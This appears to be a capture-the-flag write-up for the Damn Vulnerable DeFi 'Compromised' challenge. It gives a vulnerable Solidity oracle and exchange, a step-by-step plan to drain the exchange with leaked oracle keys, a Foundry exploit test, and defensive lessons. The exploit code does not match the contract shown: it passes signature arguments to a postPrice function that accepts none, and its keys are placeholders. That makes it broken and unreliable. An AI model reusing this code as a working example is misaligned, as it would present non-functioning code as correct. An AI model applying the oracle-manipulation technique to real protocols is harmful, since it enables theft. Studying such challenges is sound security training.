# Damn Vulnerable DeFi: Compromised

## Challenge Description
An NFT marketplace allows users to buy and sell "Compromised" NFTs. The price is determined by an Oracle. The oracle's private keys have been leaked on a public Discord channel. Your goal is to buy an NFT for an absurdly low price or drain the marketplace.

**Difficulty:** ⭐⭐⭐ (Medium)

**Goal:** Exploit the compromised oracle to buy an NFT for nearly 0 ETH.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TrustfulOracle {
    mapping(bytes32 => uint256) public prices;
    mapping(address => bool) public isTrustedSource;

    function postPrice(string calldata symbol, uint256 newPrice) external {
        require(isTrustedSource[msg.sender], "Not trusted");
        prices[keccak256(abi.encodePacked(symbol))] = newPrice;
    }

    function getMedianPrice(string calldata symbol) external view returns (uint256) {
        return prices[keccak256(abi.encodePacked(symbol))];
    }
}

contract Exchange {
    TrustfulOracle public oracle;
    uint256 public constant NFT_PRICE = 100 ether; // Supposedly

    constructor(TrustfulOracle _oracle) {
        oracle = _oracle;
    }

    function buyOne() external payable {
        uint256 price = oracle.getMedianPrice("COMPROMISED_NFT");
        require(msg.value >= price, "Insufficient payment");

        // Transfer NFT to buyer
        // ...
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The oracle relies on signatures or specific trusted addresses to update prices.
In this challenge, the private keys of the trusted sources have been leaked.

With the private keys, an attacker can forge a valid signature (or directly call
the oracle if it's a simple access control check) to set the price of the NFT to 0 (or 1 wei).

Once the price is set to 0, the attacker can call buyOne() with 0 ETH and receive the NFT.
```

## Exploit Strategy

```text
Step 1: Obtain the leaked private keys (provided in the challenge description).
Step 2: Use the private keys to sign a message setting the price of "COMPROMISED_NFT" to 1 wei.
Step 3: Submit the signed message to the TrustfulOracle to update the price.
Step 4: Call Exchange.buyOne{value: 1 wei}().
Step 5: The exchange checks the oracle, sees the price is 1 wei, and gives you the NFT.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DamnVulnerableDeFi/Compromised.sol";

contract CompromisedExploitTest is Test {
    TrustfulOracle public oracle;
    Exchange public exchange;

    // Leaked private keys from the challenge
    uint256 constant SOURCE1_PK = 0x...;
    uint256 constant SOURCE2_PK = 0x...;

    function setUp() public {
        oracle = new TrustfulOracle();
        exchange = new Exchange(oracle);
    }

    function test_ExploitCompromised() public {
        // Step 1 & 2: Sign the price update with leaked keys
        bytes32 messageHash = keccak256(abi.encodePacked("COMPROMISED_NFT", uint256(1)));

        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(SOURCE1_PK, messageHash);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(SOURCE2_PK, messageHash);

        // Step 3: Submit the forged update to the oracle
        oracle.postPrice("COMPROMISED_NFT", 1, v1, r1, s1);
        oracle.postPrice("COMPROMISED_NFT", 1, v2, r2, s2);

        // Step 4: Buy the NFT for 1 wei
        vm.deal(address(this), 1 ether);
        exchange.buyOne{value: 1}();

        console.log("\n✅ EXPLOIT SUCCESSFUL! NFT bought for 1 wei.");
    }
}
```

## Real-World Impact

```text
This is a direct simulation of real-world private key compromises.

Real-world examples:
- Wintermute (2022): $160M lost due to a compromised Profanity vanity address generator.
- Ronin Bridge (2022): $625M lost due to compromised validator private keys via social engineering.
- Various DeFi protocols lost millions because a team member's laptop was hacked, exposing the multisig or oracle keys.

The Solution:
- Never store private keys in plain text or on internet-connected devices.
- Use Hardware Security Modules (HSMs) or MPC (Multi-Party Computation) for oracle signing.
- Implement rate limits and deviation thresholds on oracle price updates.
```

## Key Takeaways
- **Key Management is Security:** The strongest smart contract is useless if the private keys controlling it are compromised.
- **Oracle Manipulation:** If you control the oracle, you control the protocol's reality (prices, liquidations, etc.).
- **Defense in Depth:** Oracles should require multiple independent signatures, and price updates should have maximum deviation limits (e.g., price cannot change by more than 10% in one update).
- **Lesson Learned:** Treat private keys like nuclear launch codes. Assume they will be targeted constantly.
